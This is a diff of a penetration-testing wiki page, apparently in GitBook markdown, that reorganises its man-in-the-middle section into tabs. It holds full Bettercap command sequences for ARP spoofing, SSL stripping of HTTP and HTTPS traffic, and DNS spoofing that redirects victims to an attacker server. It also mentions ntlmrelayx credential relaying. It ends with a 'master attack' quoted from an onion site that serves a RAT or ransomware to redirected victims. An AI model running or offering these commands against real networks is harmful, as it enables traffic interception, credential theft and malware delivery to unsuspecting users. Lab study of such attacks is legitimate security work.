@@ -35,13 +35,6 @@
   * _Operator Handbook: Responder - pg. 265_
 {% endtab %}
 
-{% tab title="Bettercap" %}
-* [BetterCap](https://github.com/bettercap/bettercap) - ​Bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an **easy to use**, **all-in-one solution** with all the features they might possibly need for performing reconnaissance and attacking [WiFi](https://www.bettercap.org/modules/wifi/) networks, [Bluetooth Low Energy](https://www.bettercap.org/modules/ble/) devices, wireless [HID](https://www.bettercap.org/modules/hid/) devices and [Ethernet](https://www.bettercap.org/modules/ethernet) networks.
-  * [https://www.bettercap.org/](https://www.bettercap.org/)
-
-
-{% endtab %}
-
 {% tab title="Impacket Scripts" %}
 * Impacket Scripts
   * [ntlmrelayx.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ntlmrelayx.py) This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy.
@@ -182,8 +175,8 @@ See the Special Targets section for more tools on attacking Cisco Devices
 
 ## MITM Methodology
 
-### **MITM concepts**
-
+{% tabs %}
+{% tab title="MITM concepts" %}
 * Most MITM programs use SSLStrip/SSLstrip+ to intercept HTTPS data by "downgrading" them to HTTP.
 * &#x20;SSLStrip+ will work against TLS and SSL if HSTS is not used.
 * &#x20;SSLStrip+ will work on anything that does not have HSTS preloaded.
@@ -195,30 +188,82 @@ See the Special Targets section for more tools on attacking Cisco Devices
   * A separate computer to be the target (Windows or MacOS preferably).
   * Attacker and Target computer/laptops connected to the same home network as you with internet connectivity.
   * Restart Kali after each tool example.
+{% endtab %}
 
-### **Bettercap**
+{% tab title="Bettercap" %}
+* [BetterCap](https://github.com/bettercap/bettercap) - ​Bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an **easy to use**, **all-in-one solution** with all the features they might possibly need for performing reconnaissance and attacking [WiFi](https://www.bettercap.org/modules/wifi/) networks, [Bluetooth Low Energy](https://www.bettercap.org/modules/ble/) devices, wireless [HID](https://www.bettercap.org/modules/hid/) devices and [Ethernet](https://www.bettercap.org/modules/ethernet) networks.
+  * [https://www.bettercap.org/](https://www.bettercap.org/)
 
-* Intercepting HTTP traffic over the network with Bettercap&#x20;
-  * In Kali open up a new Terminal window and type the following:&#x20;
-    * **#**sudo bettercap&#x20;
-  * All of the following commands below are to be entered into the bettercap window.&#x20;
-    * \#net.probe on&#x20;
-    * Wait 30 seconds for it to discover network hosts.&#x20;
-    * \#net.probe off&#x20;
-    * \#net.show&#x20;
-      * This will show you the targets on the network. Pay attention to your target IP.&#x20;
-    * set http.proxy.sslstrip true&#x20;
-    * set net.sniff.verbose false&#x20;
-    * set arp.spoof.targets TARGET\_IP&#x20;
-    * My example:&#x20;
-      * set arp.spoof.targets 192.168.2.100&#x20;
-      * net.sniff on&#x20;
-      * http.proxy on&#x20;
-      * arp.spoof on&#x20;
-* Intercepting HTTPS traffic over the network with Bettercap&#x20;
-  * In Kali open up a new terminal window and type the following:&#x20;
-    * \#sudo bettercap&#x20;
-  * All the following commands below are to be entered into the bettercap window.&#x20;
+### Intercepting HTTP traffic over the network with Bettercap&#x20;
+
+* In Kali open up a new Terminal window and type the following:&#x20;
+  * **#**sudo bettercap&#x20;
+* All of the following commands below are to be entered into the bettercap window.&#x20;
+  * \#net.probe on&#x20;
+  * Wait 30 seconds for it to discover network hosts.&#x20;
+  * \#net.probe off&#x20;
+  * \#net.show&#x20;
+    * This will show you the targets on the network. Pay attention to your target IP.&#x20;
+  * set http.proxy.sslstrip true&#x20;
+  * set net.sniff.verbose false&#x20;
+  * set arp.spoof.targets TARGET\_IP&#x20;
+  * My example:&#x20;
+    * set arp.spoof.targets 192.168.2.100&#x20;
+    * net.sniff on&#x20;
+    * http.proxy on&#x20;
+    * arp.spoof on&#x20;
+
+### Intercepting HTTPS traffic over the network with Bettercap&#x20;
+
+* In Kali open up a new terminal window and type the following:&#x20;
+  * \#sudo bettercap&#x20;
+* All the following commands below are to be entered into the bettercap window.&#x20;
+* net.probe on&#x20;
+* Wait 30 seconds for it to discover network hosts.&#x20;
+* net.probe off&#x20;
+* net.show&#x20;
+* This will show you the targets on the network. Pay attention to your target IP.&#x20;
+* set https.proxy.sslstrip true&#x20;
+* set net.sniff.verbose false&#x20;
+* set arp.spoof.targets TARGET\_IP&#x20;
+* My example:&#x20;
+  * set arp.spoof.targets 192.168.2.100&#x20;
+  * set arp.spoof.internal true&#x20;
+  * net.sniff on&#x20;
+  * https.proxy on&#x20;
+  * arp.spoof on&#x20;
+
+### Re-directing HTTP requests to your webserver over the network with Bettercap&#x20;
+
+* In Kali open up a new Terminal window and type the following:&#x20;
+  * \#sudo service apache2 restart&#x20;
+  * \#sudo bettercap&#x20;
+* All the following commands below are to be entered into the bettercap window.&#x20;
+  * net.probe on&#x20;
+  * Wait 30 seconds for it to discover network hosts.&#x20;
+  * net.probe off&#x20;
+  * net.show&#x20;
+  * This will show you the targets on the network. Pay attention to your target IP. ◇ set http.proxy.sslstrip true&#x20;
+  * set net.sniff.verbose false&#x20;
+  * set arp.spoof.targets TARGET\_IP&#x20;
+  * My example:&#x20;
+    * set arp.spoof.targets 192.168.2.100&#x20;
+    * set dns.spoof.domains __&#x20;
+    * set dns.spoof.address ATTACKER\_IP&#x20;
+  * My example:&#x20;
+    * set dns.spoof.address 192.168.2.233&#x20;
+    * set dns.spoof.all true&#x20;
+    * net.sniff on&#x20;
+    * http.proxy on&#x20;
+    * arp.spoof on&#x20;
+    * dns.spoof on&#x20;
+
+### Re-directing HTTPS requests to your webserver over the network with Bettercap&#x20;
+
+* In Kali open up a new terminal window and type the following:&#x20;
+  * \#sudo service apache2 restart&#x20;
+  * \#sudo bettercap&#x20;
+* All the following commands below are to be entered into the bettercap window.&#x20;
   * net.probe on&#x20;
   * Wait 30 seconds for it to discover network hosts.&#x20;
   * net.probe off&#x20;
@@ -227,60 +272,22 @@ See the Special Targets section for more tools on attacking Cisco Devices
   * set https.proxy.sslstrip true&#x20;
   * set net.sniff.verbose false&#x20;
   * set arp.spoof.targets TARGET\_IP&#x20;
-  * My example:&#x20;
-    * set arp.spoof.targets 192.168.2.100&#x20;
-    * set arp.spoof.internal true&#x20;
-    * net.sniff on&#x20;
-    * https.proxy on&#x20;
-    * arp.spoof on&#x20;
-* Re-directing HTTP requests to your webserver over the network with Bettercap&#x20;
-  * In Kali open up a new Terminal window and type the following:&#x20;
-    * \#sudo service apache2 restart&#x20;
-    * \#sudo bettercap&#x20;
-  * All the following commands below are to be entered into the bettercap window.&#x20;
-    * net.probe on&#x20;
-    * Wait 30 seconds for it to discover network hosts.&#x20;
-    * net.probe off&#x20;
-    * net.show&#x20;
-    * This will show you the targets on the network. Pay attention to your target IP. ◇ set http.proxy.sslstrip true&#x20;
-    * set net.sniff.verbose false&#x20;
-    * set arp.spoof.targets TARGET\_IP&#x20;
-    * My example:&#x20;
-      * set arp.spoof.targets 192.168.2.100&#x20;
-      * set dns.spoof.domains __&#x20;
-      * set dns.spoof.address ATTACKER\_IP&#x20;
-    * My example:&#x20;
-      * set dns.spoof.address 192.168.2.233&#x20;
-      * set dns.spoof.all true&#x20;
-      * net.sniff on&#x20;
-      * http.proxy on&#x20;
-      * arp.spoof on&#x20;
-      * dns.spoof on&#x20;
-* Re-directing HTTPS requests to your webserver over the network with Bettercap&#x20;
-  * In Kali open up a new terminal window and type the following:&#x20;
-    * \#sudo service apache2 restart&#x20;
-    * \#sudo bettercap&#x20;
-  * All the following commands below are to be entered into the bettercap window.&#x20;
-    * net.probe on&#x20;
-    * Wait 30 seconds for it to discover network hosts.&#x20;
-    * net.probe off&#x20;
-    * net.show&#x20;
-    * This will show you the targets on the network. Pay attention to your target IP.&#x20;
-    * set https.proxy.sslstrip true&#x20;
-    * set net.sniff.verbose false&#x20;
-    * set arp.spoof.targets TARGET\_IP&#x20;
-  * My example:
-    * set arp.spoof.targets 192.168.2.100&#x20;
-    * set dns.spoof.domains __&#x20;
-    * set dns.spoof.address ATTACKER\_IP&#x20;
-  * My example:&#x20;
-    * set dns.spoof.address 192.168.2.233&#x20;
-    * set dns.spoof.all true&#x20;
-    * net.sniff on&#x20;
-    * https.proxy on&#x20;
-    * arp.spoof on&#x20;
-    * dns.spoof on
+* My example:
+  * set arp.spoof.targets 192.168.2.100&#x20;
+  * set dns.spoof.domains __&#x20;
+  * set dns.spoof.address ATTACKER\_IP&#x20;
+* My example:&#x20;
+  * set dns.spoof.address 192.168.2.233&#x20;
+  * set dns.spoof.all true&#x20;
+  * net.sniff on&#x20;
+  * https.proxy on&#x20;
+  * arp.spoof on&#x20;
+  * dns.spoof on
 
+
+{% endtab %}
+
+{% tab title="Bettercap Master Attack" %}
 ### Bettercap Master Attack
 
 Quoted directly from [http://hacktownpagdenbb.onion/Links2/Chapter-11.html](http://hacktownpagdenbb.onion/Links2/Chapter-11.html)\
@@ -357,3 +364,5 @@ Save the file and close it.\
 Now that we have the /var/www/html/index.html file configured (you would need to replace DANGER.exe with your RAT filename. This should be obvious!) the attack is ready. In the future you'd want to run the FTP server before using bettercap.\
 \
 This attack will break all HTTPS and HTTP websites the victim is trying to browse and will re-direct them to your web server with your malware/ransomware waiting to be downloaded over FTP.
+{% endtab %}
+{% endtabs %}
